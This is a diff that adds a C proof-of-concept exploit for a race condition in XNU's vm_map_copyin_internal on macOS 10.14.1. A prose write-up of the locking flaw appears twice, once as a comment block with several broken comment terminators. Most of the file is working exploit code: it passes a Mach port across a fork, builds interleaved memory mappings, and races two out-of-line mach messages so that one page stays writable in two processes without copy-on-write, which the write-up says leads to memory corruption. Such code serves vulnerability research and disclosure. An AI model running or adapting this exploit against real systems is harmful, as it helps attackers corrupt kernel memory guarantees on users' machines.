@@ -1,0 +1,704 @@
+/*
+vm_map_copyin_internal in vm_map.c converts a region of a vm_map into "copied in" form, constructing a vm_map_copy
+structure representing the copied memory which can then be mapped into another vm_map (or the same one.)
+
+The function contains a while loop which walks through each of the vm_map_entry structures which make up the
+region to be copied and tries to append a "copy" of each in turn to a vm_map_copy structure.
+
+Under certain circumstances the copy operation can be optimized, here's a code snippet describing one such optimization:
+
+        
+         //  Attempt non-blocking copy-on-write optimizations.
+         
+        
+        if (src_destroy &&
+            (src_object == VM_OBJECT_NULL ||
+             (src_object->internal &&
+              src_object->copy_strategy == MEMORY_OBJECT_COPY_SYMMETRIC &&
+              !map_share))) {
+                 /*
+                  * If we are destroying the source, and the object
+                  * is internal, we can move the object reference
+                  * from the source to the copy.  The copy is
+                  * copy-on-write only if the source is.
+                  * We make another reference to the object, because
+                  * destroying the source entry will deallocate it.
+                  
+                 vm_object_reference(src_object);
+                 
+                 /*
+                  * Copy is always unwired.  vm_map_copy_entry
+                  * set its wired count to zero.
+                  
+                 
+                 goto CopySuccessful;
+            
+
+This optimization will apply if the vm_map_entry represents anonymous memory and the semantics of the copy
+will cause that memory to be deallocated from the source map. In this case, as the comment describes, we can just
+"move" the entry to the target map.
+
+The issue is that this move is not performed atomically - the vm_map_entry which we want to move will only be removed
+from the source map after we have copied all the entries representing the region we want to copy and the while(true) loop
+is done:
+
+    }   // end while(true)
+    
+    /*
+     * If the source should be destroyed, do it now, since the
+     * copy was successful.
+     
+    if (src_destroy) {
+        (void) vm_map_delete(
+                             src_map,
+                             vm_map_trunc_page(src_addr,
+                                               VM_MAP_PAGE_MASK(src_map)),
+                             src_end,
+                             ((src_map == kernel_map) ?
+                              VM_MAP_REMOVE_KUNWIRE :
+                              VM_MAP_NO_FLAGS),
+                             VM_MAP_NULL);
+
+
+The cause of the lack of atomicity is two-fold:
+
+Firstly: in the while loop the vm_map's lock gets dropped and retaken:
+
+        /*
+         *  Create a new address map entry to hold the result.
+         *  Fill in the fields from the appropriate source entries.
+         *  We must unlock the source map to do this if we need
+         *  to allocate a map entry.
+         
+        if (new_entry == VM_MAP_ENTRY_NULL) {
+            version.main_timestamp = src_map->timestamp;
+            vm_map_unlock(src_map);
+            
+            new_entry = vm_map_copy_entry_create(copy, !copy->cpy_hdr.entries_pageable);
+            
+            vm_map_lock(src_map);
+            if ((version.main_timestamp + 1) != src_map->timestamp) {
+                if (!vm_map_lookup_entry(src_map, src_start,
+                                         &tmp_entry)) {
+                    RETURN(KERN_INVALID_ADDRESS);
+                }
+                if (!tmp_entry->is_sub_map)
+                    vm_map_clip_start(src_map, tmp_entry, src_start);
+                continue; /* restart w/ new tmp_entry 
+            }
+        }
+
+Here, each time they allocate a new entry structure they have to drop and retake the lock.
+Secondly: the check and bailout there aren't sufficient to ensure atomicity of the "entry move" optimization:
+
+The check "if ((version.main_timestamp + 1) != src_map->timestamp) {" tries to detect whether another thread
+took the lock while we dropped it; if it did then they try to bailout and lookup the entry again.
+
+The problem is that just checking whether there is still an entry covering the address we're currently trying to
+copy isn't sufficient, since the continue statement just goes back up to the start of the while loop. It doesn't
+invalidate all the entries we've already appended to the vm_map_copy, even though while we had dropped the lock
+another thread could have come in and also started an "optimized entry move" for the same entry that we're in the process
+of moving.
+
+Note that this lock dropping and reacquiring pattern seems quite pervasive; this isn't the only place in the code where this
+happens; a proper fix for such issues will require some refactoring.
+
+This PoC demonstrates the issue by sending two mach messages in parallel, one to ourselves and one to our parent process.
+
+Those messages contain out-of-line regions built up of alternating memory object mappings and anonymous memory:
+
+                      _ _ _ _ _ _ _ _ _ _ _ _ 
+  <................../..>                    \
+  <                 {   >                     }
+  < +---+---+---+---{--->---+---+---+---+---+ }
+  < | A | O | A | O { A > O | A | O | A | O | }
+  < +---+---+---+---{--->---+---+---+---+---+ }
+  <.................{...>                     }
+           ^         \_ _ _ _ _ _ _ _ _ _ _ _/
+           |                    ^
+  OOL desc for msg_a            |
+                          OOL desc for msg_b    
+          
+
+The two messages overlap by one anonymous memory entry, appearing at the end of msg_a and the start of msg_b. The locking issue
+means that if we win the race this entry will have the move optimization applied twice, leading to it appearing in two vm_map_copys.
+
+If we then send one of those copies to another process and receive one ourselves we will retain the ability to write
+to the underlying page while the other process is reading it, without causing COW copies.
+
+This violates the semantics of mach message OOL memory, and leads to TOCTOU issues which can lead to memory corruption.
+
+PoC tested on MacOS 10.14.1 (18B75)
+*/
+
+// @i41nbeer
+
+// XNU vm_map_copy optimization which requires atomicity isn't atomic
+
+#if 0
+vm_map_copyin_internal in vm_map.c converts a region of a vm_map into "copied in" form, constructing a vm_map_copy
+structure representing the copied memory which can then be mapped into another vm_map (or the same one.)
+
+The function contains a while loop which walks through each of the vm_map_entry structures which make up the
+region to be copied and tries to append a "copy" of each in turn to a vm_map_copy structure.
+
+Under certain circumstances the copy operation can be optimized, here's a code snippet describing one such optimization:
+
+        /*
+         *	Attempt non-blocking copy-on-write optimizations.
+         */
+        
+        if (src_destroy &&
+            (src_object == VM_OBJECT_NULL ||
+             (src_object->internal &&
+              src_object->copy_strategy == MEMORY_OBJECT_COPY_SYMMETRIC &&
+              !map_share))) {
+                 /*
+                  * If we are destroying the source, and the object
+                  * is internal, we can move the object reference
+                  * from the source to the copy.  The copy is
+                  * copy-on-write only if the source is.
+                  * We make another reference to the object, because
+                  * destroying the source entry will deallocate it.
+                  */
+                 vm_object_reference(src_object);
+                 
+                 /*
+                  * Copy is always unwired.  vm_map_copy_entry
+                  * set its wired count to zero.
+                  */
+                 
+                 goto CopySuccessful;
+            
+
+This optimization will apply if the vm_map_entry represents anonymous memory and the semantics of the copy
+will cause that memory to be deallocated from the source map. In this case, as the comment describes, we can just
+"move" the entry to the target map.
+
+The issue is that this move is not performed atomically - the vm_map_entry which we want to move will only be removed
+from the source map after we have copied all the entries representing the region we want to copy and the while(true) loop
+is done:
+
+    }   // end while(true)
+    
+    /*
+     * If the source should be destroyed, do it now, since the
+     * copy was successful.
+     */
+    if (src_destroy) {
+        (void) vm_map_delete(
+                             src_map,
+                             vm_map_trunc_page(src_addr,
+                                               VM_MAP_PAGE_MASK(src_map)),
+                             src_end,
+                             ((src_map == kernel_map) ?
+                              VM_MAP_REMOVE_KUNWIRE :
+                              VM_MAP_NO_FLAGS),
+                             VM_MAP_NULL);
+
+
+The cause of the lack of atomicity is two-fold:
+
+Firstly: in the while loop the vm_map's lock gets dropped and retaken:
+
+        /*
+         *	Create a new address map entry to hold the result.
+         *	Fill in the fields from the appropriate source entries.
+         *	We must unlock the source map to do this if we need
+         *	to allocate a map entry.
+         */
+        if (new_entry == VM_MAP_ENTRY_NULL) {
+            version.main_timestamp = src_map->timestamp;
+            vm_map_unlock(src_map);
+            
+            new_entry = vm_map_copy_entry_create(copy, !copy->cpy_hdr.entries_pageable);
+            
+            vm_map_lock(src_map);
+            if ((version.main_timestamp + 1) != src_map->timestamp) {
+                if (!vm_map_lookup_entry(src_map, src_start,
+                                         &tmp_entry)) {
+                    RETURN(KERN_INVALID_ADDRESS);
+                }
+                if (!tmp_entry->is_sub_map)
+                    vm_map_clip_start(src_map, tmp_entry, src_start);
+                continue; /* restart w/ new tmp_entry */
+            }
+        }
+
+Here, each time they allocate a new entry structure they have to drop and retake the lock.
+
+Secondly: the check and bailout there aren't sufficient to ensure atomicity of the "entry move" optimization:
+
+The check "if ((version.main_timestamp + 1) != src_map->timestamp) {" tries to detect whether another thread
+took the lock while we dropped it; if it did then they try to bailout and lookup the entry again.
+
+The problem is that just checking whether there is still an entry covering the address we're currently trying to
+copy isn't sufficient, since the continue statement just goes back up to the start of the while loop. It doesn't
+invalidate all the entries we've already appended to the vm_map_copy, even though while we had dropped the lock
+another thread could have come in and also started an "optimized entry move" for the same entry that we're in the process
+of moving.
+
+Note that this lock dropping and reacquiring pattern seems quite pervasive; this isn't the only place in the code where this
+happens; a proper fix for such issues will require some refactoring.
+
+This PoC demonstrates the issue by sending two mach messages in parallel, one to ourselves and one to our parent process.
+
+Those messages contain out-of-line regions built up of alternating memory object mappings and anonymous memory:
+
+                      _ _ _ _ _ _ _ _ _ _ _ _ 
+  <................../..>                    \
+  <                 {   >                     }
+  < +---+---+---+---{--->---+---+---+---+---+ }
+  < | A | O | A | O { A > O | A | O | A | O | }
+  < +---+---+---+---{--->---+---+---+---+---+ }
+  <.................{...>                     }
+           ^         \_ _ _ _ _ _ _ _ _ _ _ _/
+           |                    ^
+  OOL desc for msg_a            |
+                          OOL desc for msg_b    
+          
+
+The two messages overlap by one anonymous memory entry, appearing at the end of msg_a and the start of msg_b. The locking issue
+means that if we win the race this entry will have the move optimization applied twice, leading to it appearing in two vm_map_copys.
+
+If we then send one of those copies to another process and receive one ourselves we will retain the ability to write
+to the underlying page while the other process is reading it, without causing COW copies.
+
+This violates the semantics of mach message OOL memory, and leads to TOCTOU issues which can lead to memory corruption.
+
+PoC tested on MacOS 10.14.1 (18B75)
+
+#endif
+
+#include <errno.h>
+#include <fcntl.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <signal.h>
+#include <pthread.h>
+#include <sys/mman.h>
+#include <sys/stat.h>
+
+#include <libkern/OSAtomic.h>
+#include <mach/mach.h>
+#include <mach/mach_error.h>
+#include <mach/mach_vm.h>
+#include <mach/task.h>
+#include <mach/task_special_ports.h>
+
+#define MACH_ERR(str, err) do { \
+  if (err != KERN_SUCCESS) {    \
+    mach_error("[-]" str "\n", err); \
+    exit(EXIT_FAILURE);         \
+  }                             \
+} while(0)
+
+#define FAIL(str) do { \
+  printf("[-] " str "\n");  \
+  exit(EXIT_FAILURE);  \
+} while (0)
+
+#define LOG(str) do { \
+  printf("[+] " str"\n"); \
+} while (0)
+
+/***************
+ * port dancer *
+ ***************/
+
+// set up a shared mach port pair from a child process back to its parent without using launchd
+// based on the idea outlined by Robert Sesek here: https://robert.sesek.com/2014/1/changes_to_xnu_mach_ipc.html
+
+// mach message for sending a port right
+typedef struct {
+  mach_msg_header_t header;
+  mach_msg_body_t body;
+  mach_msg_port_descriptor_t port;
+} port_msg_send_t;
+
+// mach message for receiving a port right
+typedef struct {
+  mach_msg_header_t header;
+  mach_msg_body_t body;
+  mach_msg_port_descriptor_t port;
+  mach_msg_trailer_t trailer;
+} port_msg_rcv_t;
+
+typedef struct {
+  mach_msg_header_t  header;
+} simple_msg_send_t;
+
+typedef struct {
+  mach_msg_header_t  header;
+  mach_msg_trailer_t trailer;
+} simple_msg_rcv_t;
+
+#define STOLEN_SPECIAL_PORT TASK_BOOTSTRAP_PORT
+
+// a copy in the parent of the stolen special port such that it can be restored
+mach_port_t saved_special_port = MACH_PORT_NULL;
+
+// the shared port right in the parent
+mach_port_t shared_port_parent = MACH_PORT_NULL;
+
+void setup_shared_port() {
+  kern_return_t err;
+  // get a send right to the port we're going to overwrite so that we can both
+  // restore it for ourselves and send it to our child
+  err = task_get_special_port(mach_task_self(), STOLEN_SPECIAL_PORT, &saved_special_port);
+  MACH_ERR("saving original special port value", err);
+
+  // allocate the shared port we want our child to have a send right to
+  err = mach_port_allocate(mach_task_self(),
+                           MACH_PORT_RIGHT_RECEIVE,
+                           &shared_port_parent);
+
+  MACH_ERR("allocating shared port", err);
+
+  // insert the send right
+  err = mach_port_insert_right(mach_task_self(),
+                               shared_port_parent,
+                               shared_port_parent,
+                               MACH_MSG_TYPE_MAKE_SEND);
+  MACH_ERR("inserting MAKE_SEND into shared port", err);
+
+  // stash the port in the STOLEN_SPECIAL_PORT slot such that the send right survives the fork
+  err = task_set_special_port(mach_task_self(), STOLEN_SPECIAL_PORT, shared_port_parent);
+  MACH_ERR("setting special port", err);
+}
+
+mach_port_t recover_shared_port_child() {
+  kern_return_t err;
+
+  // grab the shared port which our parent stashed somewhere in the special ports
+  mach_port_t shared_port_child = MACH_PORT_NULL;
+  err = task_get_special_port(mach_task_self(), STOLEN_SPECIAL_PORT, &shared_port_child);
+  MACH_ERR("child getting stashed port", err);
+
+  LOG("child got stashed port");
+
+  // say hello to our parent and send a reply port so it can send us back the special port to restore
+
+  // allocate a reply port
+  mach_port_t reply_port;
+  err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &reply_port);
+  MACH_ERR("child allocating reply port", err);
+
+  // send the reply port in a hello message
+  simple_msg_send_t msg = {0};
+
+  msg.header.msgh_size = sizeof(msg);
+  msg.header.msgh_local_port = reply_port;
+  msg.header.msgh_remote_port = shared_port_child;
+
+  msg.header.msgh_bits = MACH_MSGH_BITS (MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE);
+
+  err = mach_msg_send(&msg.header);
+  MACH_ERR("child sending task port message", err);
+
+  LOG("child sent hello message to parent over shared port");
+
+  // wait for a message on the reply port containing the stolen port to restore
+  port_msg_rcv_t stolen_port_msg = {0};
+  err = mach_msg(&stolen_port_msg.header, MACH_RCV_MSG, 0, sizeof(stolen_port_msg), reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
+  MACH_ERR("child receiving stolen port\n", err);
+
+  // extract the port right from the message
+  mach_port_t stolen_port_to_restore = stolen_port_msg.port.name;
+  if (stolen_port_to_restore == MACH_PORT_NULL) {
+    FAIL("child received invalid stolen port to restore");
+  }
+
+  // restore the special port for the child
+  err = task_set_special_port(mach_task_self(), STOLEN_SPECIAL_PORT, stolen_port_to_restore);
+  MACH_ERR("child restoring special port", err);
+
+  LOG("child restored stolen port");
+  return shared_port_child;
+}
+
+mach_port_t recover_shared_port_parent() {
+  kern_return_t err;
+
+  // restore the special port for ourselves
+  err = task_set_special_port(mach_task_self(), STOLEN_SPECIAL_PORT, saved_special_port);
+  MACH_ERR("parent restoring special port", err);
+
+  // wait for a message from the child on the shared port
+  simple_msg_rcv_t msg = {0};
+  err = mach_msg(&msg.header,
+                 MACH_RCV_MSG,
+                 0,
+                 sizeof(msg),
+                 shared_port_parent,
+                 MACH_MSG_TIMEOUT_NONE,
+                 MACH_PORT_NULL);
+  MACH_ERR("parent receiving child hello message", err);
+
+  LOG("parent received hello message from child");
+
+  // send the special port to our child over the hello message's reply port
+  port_msg_send_t special_port_msg = {0};
+
+  special_port_msg.header.msgh_size        = sizeof(special_port_msg);
+  special_port_msg.header.msgh_local_port  = MACH_PORT_NULL;
+  special_port_msg.header.msgh_remote_port = msg.header.msgh_remote_port;
+  special_port_msg.header.msgh_bits        = MACH_MSGH_BITS(MACH_MSGH_BITS_REMOTE(msg.header.msgh_bits), 0) | MACH_MSGH_BITS_COMPLEX;
+  special_port_msg.body.msgh_descriptor_count = 1;
+
+  special_port_msg.port.name        = saved_special_port;
+  special_port_msg.port.disposition = MACH_MSG_TYPE_COPY_SEND;
+  special_port_msg.port.type        = MACH_MSG_PORT_DESCRIPTOR;
+
+  err = mach_msg_send(&special_port_msg.header);
+  MACH_ERR("parent sending special port back to child", err);
+
+  return shared_port_parent;
+}
+
+/*** end of port dancer code ***/
+
+#define UNIT_SIZE 0x8000
+
+struct send_msg {
+  mach_msg_header_t hdr;
+  mach_msg_body_t body;
+  mach_msg_ool_descriptor_t desc;
+};
+
+struct rcv_msg {
+  mach_msg_header_t hdr;
+  mach_msg_body_t body;
+  mach_msg_ool_descriptor_t desc;
+  mach_msg_trailer_t trailer;
+};
+
+volatile int lock_a;
+volatile int lock_b;
+
+void* thread_func(void* arg) {
+  lock_a = 1;
+  while(lock_b == 0) {;}
+  kern_return_t err = mach_msg_send((mach_msg_header_t*)arg);
+  return (void*) err;
+}
+
+
+void do_child(mach_port_t shared_port) {
+  uint32_t n_pairs = 32;
+  uint32_t offset = 8;
+  // allocate a memory object which we can use for the alternating object entries:
+  memory_object_size_t obj_size = n_pairs * UNIT_SIZE;
+
+  printf("allocating 0x%llx byte memory entry for alternating entries\n", obj_size);
+
+  void* obj_buf = NULL;
+  kern_return_t err = mach_vm_allocate(mach_task_self(),
+                                       (mach_vm_address_t*)&obj_buf,
+                                       obj_size,
+                                       VM_FLAGS_ANYWHERE);
+
+  memset(obj_buf, 'A', obj_size);
+
+  mach_port_t mem_port = MACH_PORT_NULL;
+  err  = mach_make_memory_entry_64(mach_task_self(),
+                                   (memory_object_size_t*)&obj_size,
+                                   (memory_object_offset_t)obj_buf,
+                                   VM_PROT_DEFAULT,
+                                   &mem_port,
+                                   MACH_PORT_NULL);
+  if (err != KERN_SUCCESS) {
+    printf("failed to make memory entry\n");
+    return;
+  }
+
+  mach_vm_address_t target_buffer_base = 0x414100000000;
+  mach_vm_address_t addr = target_buffer_base;
+  for (uint32_t i = 0; i < n_pairs; i++) {
+    // first element of the pair is an anonymous page:
+    err = mach_vm_allocate(mach_task_self(),
+                           &addr,
+                           UNIT_SIZE,
+                           VM_FLAGS_FIXED);
+
+    if (err != KERN_SUCCESS) {
+      printf("mach_vm_allocate with VM_MAP_FIXED failed: %x %s\n", err, mach_error_string(err));
+      return;
+    }
+
+    memset((void*)addr, 'B', UNIT_SIZE);
+
+    addr += UNIT_SIZE;
+
+    // second element is a page from the memory entry
+    err = mach_vm_map(mach_task_self(),
+                      &addr, // &address
+                      (mach_vm_size_t)UNIT_SIZE, // size
+                      0xfff, // mask
+                      VM_FLAGS_FIXED, // flags
+                      mem_port, // object
+                      (mach_vm_offset_t)(i*UNIT_SIZE), // offset
+                      0, // copy
+                      3, // cur_prot
+                      3, // max_prot
+                      2);// inheritance
+
+    if (err != KERN_SUCCESS) {
+      printf("failed to mach_vm_map a page from the memory object: %x %s\n", err, mach_error_string(err));
+      return;
+    }
+
+    addr += UNIT_SIZE;
+  }
+
+
+  // split this thing in to two overlapping OOL regions:
+  // offset is the n'th anonymous region which should be at the end of the OOL region of msg_a
+  // and also at the start of the OOL region of msg_b
+
+  // we'll send a to ourselves, and b to the other process
+
+  uint32_t msg_a_size = UNIT_SIZE + (2 * offset * UNIT_SIZE);
+  uint8_t* msg_a_buf = (void*)target_buffer_base;
+
+  uint8_t* msg_b_buf = (uint8_t*)(target_buffer_base + msg_a_size - UNIT_SIZE);
+  uint32_t msg_b_size = (n_pairs * 2 * UNIT_SIZE) - msg_a_size + UNIT_SIZE;
+
+  printf("msg_a %p %x\n", msg_a_buf, msg_a_size);
+  printf("msg_b %p %x\n", msg_b_buf, msg_b_size);
+
+  mach_port_t msg_a_port = MACH_PORT_NULL;
+  err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &msg_a_port);
+  if (err != KERN_SUCCESS) {
+    printf("mach_port_allocate failed: %x %s\n", err, mach_error_string(err));
+    return;
+  }
+
+  struct send_msg msg_a = {};
+  struct send_msg msg_b = {};
+
+  // message a
+  msg_a.hdr.msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_MAKE_SEND, 0, 0, 0) | MACH_MSGH_BITS_COMPLEX;
+  msg_a.hdr.msgh_size = sizeof(struct send_msg);
+  msg_a.hdr.msgh_remote_port = msg_a_port;
+  msg_a.hdr.msgh_local_port = MACH_PORT_NULL;
+  msg_a.hdr.msgh_voucher_port = MACH_PORT_NULL;
+  msg_a.hdr.msgh_id = 0x41424344;
+
+  msg_a.body.msgh_descriptor_count = 1;
+
+  msg_a.desc.type = MACH_MSG_OOL_DESCRIPTOR;
+  msg_a.desc.copy = MACH_MSG_VIRTUAL_COPY;
+  msg_a.desc.deallocate = 1;
+  msg_a.desc.address = msg_a_buf;
+  msg_a.desc.size = msg_a_size;
+
+  // message b
+  msg_b.hdr.msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_COPY_SEND, 0, 0, 0) | MACH_MSGH_BITS_COMPLEX;
+  msg_b.hdr.msgh_size = sizeof(struct send_msg);
+  msg_b.hdr.msgh_remote_port = shared_port;
+  msg_b.hdr.msgh_local_port = MACH_PORT_NULL;
+  msg_b.hdr.msgh_voucher_port = MACH_PORT_NULL;
+  msg_b.hdr.msgh_id = 0x41424344;
+
+  msg_b.body.msgh_descriptor_count = 1;
+
+  msg_b.desc.type = MACH_MSG_OOL_DESCRIPTOR;
+  msg_b.desc.copy = MACH_MSG_VIRTUAL_COPY;
+  msg_b.desc.deallocate = 1;
+  msg_b.desc.address = msg_b_buf;
+  msg_b.desc.size = msg_b_size;
+
+  // try sending them in parallel;
+  // need a thread we can try to sync with:
+  lock_a = 0;
+  lock_b = 0;
+
+  pthread_t th;
+  pthread_create(&th, NULL, thread_func, (void*)&msg_a);
+
+  while(lock_a == 0){;}
+  lock_b = 1;
+
+  kern_return_t msg_b_err = mach_msg_send(&msg_b.hdr);
+
+  void* remote_retval = 0;
+  pthread_join(th, &remote_retval);
+  kern_return_t msg_a_err = (kern_return_t)remote_retval;
+
+  printf("msg_a send: %x %s\n", msg_a_err, mach_error_string(msg_a_err));
+  printf("msg_b send: %x %s\n", msg_b_err, mach_error_string(msg_b_err));
+
+  struct rcv_msg rcv_msg_a = {0};
+
+  if (msg_a_err == KERN_SUCCESS) {
+    rcv_msg_a.hdr.msgh_local_port = msg_a_port;
+    rcv_msg_a.hdr.msgh_size = sizeof(struct rcv_msg);
+    err = mach_msg_receive(&rcv_msg_a.hdr);
+    if (err != KERN_SUCCESS) {
+      printf("mach_msg_receive failed for msg_a_port: %x %s\n", err, mach_error_string(err));
+    }
+  }
+
+  printf("dual send success!\n");
+  char* rcv_a_addr = rcv_msg_a.desc.address;
+  uint32_t rcv_a_size = rcv_msg_a.desc.size;
+
+  printf("a: %p %x\n", rcv_a_addr, rcv_a_size);
+
+  volatile char* rcv_a_char_addr = rcv_a_addr + (rcv_a_size - 1);
+
+
+  printf("rcv_a_char_addr: %p\n", rcv_a_char_addr);
+
+  while (1) {
+    *rcv_a_char_addr = 'X';
+    *rcv_a_char_addr = 'O';
+  }
+}
+
+void do_parent(mach_port_t shared_port) {
+  kern_return_t err;
+
+  // wait for our child to send us an OOL message
+  struct rcv_msg msg = {0};
+  msg.hdr.msgh_local_port = shared_port;
+  msg.hdr.msgh_size = sizeof(msg);
+  err = mach_msg_receive(&msg.hdr);
+  MACH_ERR("parent receiving child OOL message", err);
+
+  char* rcv_b_addr = msg.desc.address;
+  volatile char* rcv_b_char_addr = rcv_b_addr + (UNIT_SIZE-1);
+  
+  printf("rcv_a_char_addr: %p\n", rcv_b_char_addr);
+
+  while(1) {
+    printf("parent sees in OOL desc: %c\n", *rcv_b_char_addr);
+    usleep(100000);
+  }
+}
+
+int main(int argc, char** argv) {
+  setup_shared_port();
+
+  pid_t child_pid = fork();
+  if (child_pid == -1) {
+    FAIL("forking");
+  }
+
+  if (child_pid == 0) {
+    mach_port_t shared_port_child = recover_shared_port_child();
+    do_child(shared_port_child);
+  } else {
+    mach_port_t shared_port_parent = recover_shared_port_parent();
+    do_parent(shared_port_parent);
+  }
+
+  kill(child_pid, 9);
+  int status;
+  wait(&status); 
+
+  return 0;
+}
